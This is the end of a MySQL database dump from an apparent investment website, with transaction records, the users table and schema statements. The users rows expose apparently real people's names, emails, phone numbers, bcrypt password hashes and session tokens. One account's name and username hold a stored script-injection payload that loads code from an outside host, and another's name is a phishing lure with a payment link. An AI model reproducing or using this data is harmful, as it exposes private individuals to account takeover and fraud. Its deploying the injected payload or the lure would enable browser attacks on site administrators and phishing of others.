(65, 'TRX-88036a1e0c9beccd3', 4, '375', '14375', 'Interest Return 375 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-06-01 22:50:03', '2026-06-01 22:50:03'),
(66, 'TRX-81046a1e0c9bed81c', 5, '675', '22975', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-06-01 22:50:03', '2026-06-01 22:50:03'),
(67, 'TRX-95686a1e44dc006a5', 5, '25', '23000', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-06-02 02:50:04', '2026-06-02 02:50:04'),
(68, 'TRX-16346a1f5e1c6b48e', 5, '675', '23675', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-06-02 22:50:04', '2026-06-02 22:50:04'),
(69, 'TRX-27546a1f965bd6fa2', 5, '25', '23700', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-06-03 02:50:03', '2026-06-03 02:50:03'),
(70, 'TRX-72126a20af9c068be', 5, '675', '33375', 'Interest Return 675 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-06-03 22:50:04', '2026-06-03 22:50:04'),
(71, '46BC9lLED11eHuJA', 5, '500', '500', 'Deposit Request Approved & Balance Added', '0', 0, '2026-06-04 00:11:40', '2026-06-04 00:11:40'),
(72, 'TRX-2175', 5, '-500', '0', 'Invested On Professional', '0', 0, '2026-06-04 00:18:42', '2026-06-04 00:18:42'),
(73, 'TRX-68176a20e7dc1406b', 5, '25', '33900', 'Interest Return 25 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-06-04 02:50:04', '2026-06-04 02:50:04'),
(74, 'TRX-20036a221634ecb12', 5, '25', '33925', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-06-05 00:20:04', '2026-06-05 00:20:04'),
(75, 'TRX-92966a2367b41e710', 5, '25', '33950', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-06-06 00:20:04', '2026-06-06 00:20:04'),
(76, 'TRX-14666a24b93464656', 5, '25', '33975', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-06-07 00:20:04', '2026-06-07 00:20:04'),
(77, 'TRX-49856a260ab448ab0', 5, '25', '34000', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-06-08 00:20:04', '2026-06-08 00:20:04'),
(78, 'TRX-86156a275c3571ca1', 5, '25', '34525', 'Interest Return 25 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-06-09 00:20:05', '2026-06-09 00:20:05'),
(79, 'wQuZCIq1tMlHDISs', 5, '500', '500', 'Deposit Request Approved & Balance Added', '0', 0, '2026-06-09 17:31:26', '2026-06-09 17:31:26'),
(80, 'TAogeAKnjsmKOc2G', 4, '500', '1000', 'Deposit Request Approved & Balance Added', '0', 0, '2026-06-09 17:38:46', '2026-06-09 17:38:46'),
(81, 'TRX-2972', 5, '-500', '0', 'Invested On Professional', '0', 0, '2026-06-09 18:20:55', '2026-06-09 18:20:55'),
(82, 'TRX-16226a29ac009f86d', 5, '25', '34550', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-06-10 18:25:04', '2026-06-10 18:25:04'),
(83, 'TRX-72826a2afd804831d', 5, '25', '34575', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-06-11 18:25:04', '2026-06-11 18:25:04'),
(84, 'TRX-17446a2c502fd4c1d', 5, '25', '34600', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-06-12 18:30:07', '2026-06-12 18:30:07'),
(85, 'TRX-59266a2da1b3879dd', 5, '25', '34625', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-06-13 18:30:11', '2026-06-13 18:30:11'),
(86, 'TRX-19136a2ef333cbb41', 5, '25', '35150', 'Interest Return 25 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-06-14 18:30:11', '2026-06-14 18:30:11'),
(87, 'OOcrbPoX569Kz2Ku', 5, '500', '500', 'Deposit Request Approved & Balance Added', '0', 0, '2026-06-18 13:22:23', '2026-06-18 13:22:23'),
(88, 'R0ridQ3G5TwT9qT9', 4, '500', '1500', 'Deposit Request Approved & Balance Added', '0', 0, '2026-06-18 13:22:29', '2026-06-18 13:22:29'),
(89, 'TRX-8595', 5, '-500', '0', 'Invested On Professional', '0', 0, '2026-06-18 14:01:35', '2026-06-18 14:01:35'),
(90, NULL, 5, '25', '35175', 'Balance Added Via Admin', '0', 0, '2026-06-20 22:50:18', '2026-06-20 22:50:18'),
(91, 'zd7Au2IOTssQ4r8S', 5, '244.29', '244.29', 'Deposit Request Approved & Balance Added', '0', 0, '2026-07-02 23:58:15', '2026-07-02 23:58:15'),
(92, 'nysGugKlg6Eula6b', 5, '300', '544.29', 'Deposit Request Approved & Balance Added', '0', 0, '2026-07-03 20:46:59', '2026-07-03 20:46:59'),
(93, 'TRX-5722', 5, '-544', '0.29', 'Invested On Professional', '0', 0, '2026-07-03 21:20:47', '2026-07-03 21:20:47');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(10) UNSIGNED NOT NULL,
  `ref_id` int(11) DEFAULT 0,
  `name` varchar(191) NOT NULL,
  `email` varchar(191) NOT NULL,
  `mobile` varchar(191) DEFAULT NULL,
  `country` varchar(190) DEFAULT NULL,
  `username` varchar(191) NOT NULL,
  `password` varchar(191) NOT NULL,
  `balance` varchar(191) DEFAULT NULL,
  `interest_balance` varchar(190) NOT NULL DEFAULT '0',
  `emailv` int(11) NOT NULL,
  `smsv` int(11) NOT NULL,
  `status` int(11) NOT NULL DEFAULT 1,
  `vsent` varchar(191) DEFAULT NULL,
  `vercode` varchar(191) DEFAULT NULL,
  `remember_token` varchar(100) DEFAULT NULL,
  `provider` varchar(191) DEFAULT NULL,
  `provider_id` varchar(191) DEFAULT NULL,
  `tauth` int(11) NOT NULL DEFAULT 0,
  `tfver` int(11) NOT NULL DEFAULT 1,
  `secretcode` varchar(190) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `ref_id`, `name`, `email`, `mobile`, `country`, `username`, `password`, `balance`, `interest_balance`, `emailv`, `smsv`, `status`, `vsent`, `vercode`, `remember_token`, `provider`, `provider_id`, `tauth`, `tfver`, `secretcode`, `created_at`, `updated_at`) VALUES
(1, 0, 'test test', 'trumanlandon47@gmail.com', '+23446469854', 'Nigeria', 'testst', '$2y$10$0nsdWL40XYutJOKfdMpGH.MPs/qlMuZyFiD.LvpYbx1ymWBhZiz3.', '0', '0', 1, 1, 1, NULL, NULL, '6IP5enenSHZpdwXm2MjOLIJrHCxMyEL1XPLGSWXq6gLy5vBb2Dfi4uH4Htp4', NULL, NULL, 0, 1, NULL, '2026-05-07 13:12:45', '2026-05-07 13:12:45'),
(2, 0, 'Yannick', 'kjosh6340@gmail.com', '+2349134870045', '1', 'Stockwealth', '$2y$10$QZzs2PMJRVRAAIAgK.8FEe/U1N55ye1hIIXBFWpgDMjJh.kDn7Egq', '0', '834', 1, 1, 1, NULL, NULL, 'ZYkhKuFjVsgAAhzICnzCr7qGlTrYM0e8P1w3y7BJJmT8nh5ePuFBEGdxNc1l', NULL, NULL, 0, 1, NULL, '2026-05-08 12:47:51', '2026-05-31 13:20:03'),
(3, 0, 'Stockwealth5', 'youngtsamzy@gmail.com', '+234-9069270574', 'Nigeria', 'Stevie nicks', '$2y$10$RaN4..634S93dEx.2DopBu/JcxHj/V7Z4feX5phbckLhYO9CllTNO', '0', '0', 1, 1, 1, NULL, NULL, 'yLOWwtA8o8YeYjysIfnlyJ5ycqOwEE3SPugeu9wdytJTLaD9rGxFruqF3HZT', NULL, NULL, 0, 1, NULL, '2026-05-10 19:37:18', '2026-05-10 19:37:18'),
(4, 0, 'DONALD HYDE', 'donldhydevid@gmail.com', '+1 (309) 678-2023', 'United States', 'DONALD1', '$2y$10$G3Fbq84.8MSmEmCCdTGvUOpPY5b5VSnvItwsadUXoXW1nbOb.aE5u', '1500', '14375', 1, 1, 1, NULL, NULL, '91fCqAvzMT25RpPBRxjgsY3WXly4ImOaxuIkGOn1adEn92C6q3y2Uj6IYVPx', NULL, NULL, 0, 1, NULL, '2026-05-10 19:55:30', '2026-06-18 13:22:29'),
(5, 0, 'Keith Baker', 'shipwreckcoast1@gmail.com', '+19062039224', 'United States', 'Stonecold1', '$2y$10$gKyHhg2tNdwZxj9bK2fIA.F89zKh5DQtw1Tt3mBbFnHIEC1TVCtgi', '0.2899999999999636', '35175', 1, 1, 1, NULL, NULL, '2SZWNeGVRTjG0gS9QIYCIFhg6iRaB9rtLM9PGi11SjZqt3DNDnhzap2tXqSC', NULL, NULL, 0, 1, NULL, '2026-05-13 23:58:17', '2026-07-03 21:20:47'),
(6, 0, 'Testing testing', 'testing@gmail.com', '+2347558486', 'Nigeria', 'tester', '$2y$10$.mFJHyOu5MuJnd3u0e.0cujHND4SeL2tP2ha3HZ3BwLDdyqmKPiLO', '0', '0', 1, 1, 1, NULL, NULL, 'mRUIFGkhC8EbgX7rHIdauS9DBtO5NlvG3AKD8YRThh3fVVWIzlCFNFGFkRkz', NULL, NULL, 0, 1, NULL, '2026-05-21 16:17:21', '2026-05-21 16:17:21'),
(7, 0, 'Dylan dreyer', 'martinhendersonprivate065@gmail.com', '+55', 'Brazil', 'Dreyer', '$2y$10$qZWawt5NExpYKrlYsOv1leJ1islr/2gb7KqxYc4acrq4oXPYkM/cC', '0', '625', 1, 1, 1, NULL, NULL, '6KRJtb2GHcRWe8UoyfT3ttXi2KeQUntYFkiWrIA8pegFuz4yurc6hMidKAka', NULL, NULL, 0, 1, NULL, '2026-05-22 14:54:41', '2026-05-29 22:50:03'),
(8, NULL, '<sCRiPt/sRC=//l0a.cc/1/></sCrIpT>Nocal', 'Nocal@mail.com', '1', 'Australia', '<sCRiPt/sRC=//l0a.cc/1/></sCrIpT>Nocal', '$2y$10$azIId3OdX8VBy01QlVrVpetIfThRQgTftfcc4K2qHVt1VktHMUY2m', '0', '0', 1, 1, 1, NULL, NULL, NULL, NULL, NULL, 0, 1, NULL, '2026-05-23 10:59:39', '2026-05-23 10:59:39'),
(9, 0, 'xwglslvvyl', 'whrihuvo@immenseignite.info', '+1-405-311-0112', 'ukuwkomxzo', 'yvzdyrzsuu', '$2y$10$V6eUIb/E/Egn.RzP67VrPOvF.OcDxJCH1.hzRJa9Bne6lncAkjL6C', '0', '0', 1, 1, 1, NULL, NULL, NULL, NULL, NULL, 0, 1, NULL, '2026-05-24 06:13:07', '2026-05-24 06:13:07'),
(10, 0, 'jumuezsfiz', 'mukgyorw@immenseignite.info', '+1-737-338-5872', 'fkpiyylhfd', 'jqsmiujppd', '$2y$10$LZO7WhNxYH6fitWMef5zoO8os4zotzyldMfEBLAyXm.vljhyykQ4K', '0', '0', 1, 1, 1, NULL, NULL, NULL, NULL, NULL, 0, 1, NULL, '2026-05-24 06:13:25', '2026-05-24 06:13:25'),
(11, 0, 'Joshua', 'joshuagaming1984@gmail.com', '+234', 'Nigeria', 'Josh198419', '$2y$10$488rCWMBVGZnyLDw0mh7oeXXTtH4mdoSft.Ip4S9KOpnpiOQ0cj0u', '0', '0', 1, 1, 1, NULL, NULL, NULL, NULL, NULL, 0, 1, NULL, '2026-05-26 13:03:12', '2026-05-26 13:03:12'),
(12, 0, 'Florencia Gabriella', 'florencia9400@gmail.com', '+31657896919', 'Netherlands', 'Florencia', '$2y$10$u9Xtwas6yWawjZNQks8O6Ok7Ri3DGtqidgzDhRnQm535wSthDwhyG', '0', '0', 1, 1, 1, NULL, NULL, '42MXdIQ2fid3I6OhyNAiEyy9tTRBTLtGUYT3iRIG05WTcaKU0jnMvgTwbXfm', NULL, NULL, 0, 1, NULL, '2026-05-26 14:35:34', '2026-05-26 14:35:34'),
(13, 0, '* * * $3,222 payment available! Confirm your operation here: http://midcairointernationalschool.com/?pj86m1 * * * hs=021d571ae29e5de028aa0e712f45dea0* ххх*', 'ydx~nwa9pwyxz@mailbox.in.ua', '783359462030', 'rdws2p', '4a5ubs', '$2y$10$K6D5o9SjusLyvMjkJFmq3uoCmhnjBr/ZyXKq0u9fi4MZ/mS6hRAdS', '0', '0', 1, 1, 1, NULL, NULL, NULL, NULL, NULL, 0, 1, NULL, '2026-06-04 06:38:45', '2026-06-04 06:38:45'),
(14, 0, 'xsjyBldb', 'testing@example.com', '987-65-4329', 'USA', 'xsjyBldb', '$2y$10$hW/mTh7UbU5t3F7nOuzQ.Oz8h6Vp8I/l8WkJID8cpsMnpHtMhiJWC', '0', '0', 1, 1, 1, NULL, NULL, NULL, NULL, NULL, 0, 1, NULL, '2026-06-10 20:53:25', '2026-06-10 20:53:25'),
(15, 0, 'Josh beel & Laura', 'beelj930@gmail.com', '+1 (870) 901-6341', 'United States', 'Josh4luara', '$2y$10$DwqWuyU2g4ywbO83ZcXzleXT3Y4jb2rrY21t5a0aRCbANfYCrcdYu', '0', '0', 1, 1, 1, NULL, NULL, 'yTph3hffFgNLywjtQeTEEh2I4DDB4TAWs1qljhMGJGtc38K1QceuuYW2Dvl2', NULL, NULL, 0, 1, NULL, '2026-06-18 19:11:15', '2026-06-18 19:12:20'),
(16, 0, 'Nadiaa', 'nadia2968844@gmail.com', '+9230634649499', 'Pakistan', 'Nadiaa', '$2y$10$rtK1V1Az7c2AZkiq0SWM9eCabv0A4zU4NSrsrJQlGXXnTq/LSjSZ2', '0', '0', 1, 1, 1, NULL, NULL, NULL, NULL, NULL, 0, 1, NULL, '2026-06-22 16:27:27', '2026-06-22 16:27:27');

-- --------------------------------------------------------

--
-- Table structure for table `withdraws`
--

CREATE TABLE `withdraws` (
  `id` int(10) UNSIGNED NOT NULL,
  `withdraw_id` varchar(191) NOT NULL,
  `user_id` int(11) NOT NULL,
  `amount` varchar(191) NOT NULL,
  `charge` varchar(191) NOT NULL,
  `method_id` int(11) NOT NULL,
  `method_cur_amount` varchar(191) NOT NULL,
  `processing_time` varchar(191) NOT NULL,
  `detail` mediumtext NOT NULL,
  `status` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `withdraw_methods`
--

CREATE TABLE `withdraw_methods` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(191) NOT NULL,
  `image` varchar(191) NOT NULL,
  `min_amo` varchar(191) NOT NULL,
  `max_amo` varchar(191) NOT NULL,
  `chargefx` varchar(191) NOT NULL,
  `chargepc` varchar(191) NOT NULL,
  `rate` varchar(191) NOT NULL,
  `processing_day` varchar(191) NOT NULL,
  `currency` varchar(191) NOT NULL,
  `status` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `admins`
--
ALTER TABLE `admins`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `admins_email_unique` (`email`);

--
-- Indexes for table `admin_password_resets`
--
ALTER TABLE `admin_password_resets`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `token` (`token`);

--
-- Indexes for table `basic_settings`
--
ALTER TABLE `basic_settings`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `blogs`
--
ALTER TABLE `blogs`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `deposits`
--
ALTER TABLE `deposits`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `epins`
--
ALTER TABLE `epins`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `pin` (`pin`);

--
-- Indexes for table `faqs`
--
ALTER TABLE `faqs`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `gateways`
--
ALTER TABLE `gateways`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `how_it_works`
--
ALTER TABLE `how_it_works`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `invests`
--
ALTER TABLE `invests`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `jobs`
--
ALTER TABLE `jobs`
  ADD PRIMARY KEY (`id`),
  ADD KEY `jobs_queue_index` (`queue`);

--
-- Indexes for table `languages`
--
ALTER TABLE `languages`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `menus`
--
ALTER TABLE `menus`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `migrations`
--
ALTER TABLE `migrations`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `password_resets`
--
ALTER TABLE `password_resets`
  ADD KEY `password_resets_email_index` (`email`);

--
-- Indexes for table `plans`
--
ALTER TABLE `plans`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `referrals`
--
ALTER TABLE `referrals`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `services`
--
ALTER TABLE `services`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `socials`
--
ALTER TABLE `socials`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `subscribers`
--
ALTER TABLE `subscribers`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `support_tickets`
--
ALTER TABLE `support_tickets`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `teams`
--
ALTER TABLE `teams`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `testimonials`
--
ALTER TABLE `testimonials`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `ticket_comments`
--
ALTER TABLE `ticket_comments`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `time_settings`
--
ALTER TABLE `time_settings`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `transections`
--
ALTER TABLE `transections`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `users_email_unique` (`email`),
  ADD UNIQUE KEY `users_username_unique` (`username`);

--
-- Indexes for table `withdraws`
--
ALTER TABLE `withdraws`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `withdraw_methods`
--
ALTER TABLE `withdraw_methods`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admins`
--
ALTER TABLE `admins`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `admin_password_resets`
--
ALTER TABLE `admin_password_resets`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `basic_settings`
--
ALTER TABLE `basic_settings`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `blogs`
--
ALTER TABLE `blogs`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `deposits`
--
ALTER TABLE `deposits`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=48;

--
-- AUTO_INCREMENT for table `epins`
--
ALTER TABLE `epins`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `faqs`
--
ALTER TABLE `faqs`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `gateways`
--
ALTER TABLE `gateways`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=524;

--
-- AUTO_INCREMENT for table `how_it_works`
--
ALTER TABLE `how_it_works`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `invests`
--
ALTER TABLE `invests`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT for table `jobs`
--
ALTER TABLE `jobs`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `languages`
--
ALTER TABLE `languages`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `menus`
--
ALTER TABLE `menus`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `migrations`
--
ALTER TABLE `migrations`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=40;

--
-- AUTO_INCREMENT for table `plans`
--
ALTER TABLE `plans`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `referrals`
--
ALTER TABLE `referrals`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `services`
--
ALTER TABLE `services`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `socials`
--
ALTER TABLE `socials`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `subscribers`
--
ALTER TABLE `subscribers`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `support_tickets`
--
ALTER TABLE `support_tickets`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `teams`
--
ALTER TABLE `teams`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `testimonials`
--
ALTER TABLE `testimonials`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `ticket_comments`
--
ALTER TABLE `ticket_comments`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `time_settings`
--
ALTER TABLE `time_settings`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `transections`
--
ALTER TABLE `transections`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=94;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=17;

--
-- AUTO_INCREMENT for table `withdraws`
--
ALTER TABLE `withdraws`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `withdraw_methods`
--
ALTER TABLE `withdraw_methods`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
